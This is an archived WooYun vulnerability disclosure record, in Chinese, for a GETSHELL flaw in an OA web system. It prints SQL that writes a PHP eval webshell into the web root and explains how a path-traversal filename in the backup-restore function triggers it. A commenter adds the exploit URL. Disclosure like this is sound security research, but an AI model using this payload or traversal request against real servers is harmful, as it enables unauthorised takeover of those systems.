{"id": 5504, "wybug_id": "wooyun-2013-045488", "wybug_title": "天生创想OA系统GETSHELL漏洞", "wybug_corp": "天生创想OA", "wybug_author": "xfkxfk", "wybug_date": "2013-12-11 14:18", "wybug_open_date": "2014-03-11 14:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 天生创想OA通过绕过限制操作任意文件，GETSHELL 详细说明：  看看出现问题的代码：\n\n问题出在数据库备份还原处。主要在这里的file_get_contents处，把传进来的filename加上filename所在目录就是所要打开的文件路径了。这里的filename所在目录就是data_dir，也就是数据库备份的的目录data/db/目录了。正常情况下是data/db/xxx.sql，这是所要还原的数据文件的路径，我们传进来的是xxx.sql文件名，那么我们通过../../就回到了根目录下，就可以跳到其他目录的文件了，这里也没有检测后缀，那么我们传一个内容为sql语句的jpg文件，这里进行还原就会执行我们的sql语句啦。传文件，这里我们上传的文件内容是sql语句如下：Drop TABLE IF EXISTS temp;Create TABLE temp(cmd text NOT NULL);Insert INTO temp (cmd) VALUES(\"<?php @eval($_POST['cmd']);?>\");Select cmd from temp into outfile 'F:/wwwroot/Apache2/htdocs/TOA/eval.php';Drop TABLE IF EXISTS temp;这样就会在根目录下创建一个eval.php的一句话小马文件。\n\n然后我们随便找一个数据表备份一下，返回了备份sql文件的所在目录：\n\n然后我们来还原一下这个备份的sql文件：\n\n然后抓包：\n\n这里的filename是刚才备份的sql文件，我们修改一下：\n\n成功还原了我们的替换了文件的sql备份文件，我们来连接一下是否创建eval.php成功：\n\n成功连接，拿下shell。   漏洞证明：  \n\n   修复方案：  控制还原数据的文件类型。禁止文件包含等。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-02-17 22:52 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @疯狗 为啥这个不给cncert处理啊    \n     2014-03-11 16:07 |    \t\tTea \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:37        | Can't We Be Young.)\t\t \n  admin.php?ac=data&fileurl=mana&do=import_save&fn=../uploadfile\\1\\20131106\\20131106073130.jpg......    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}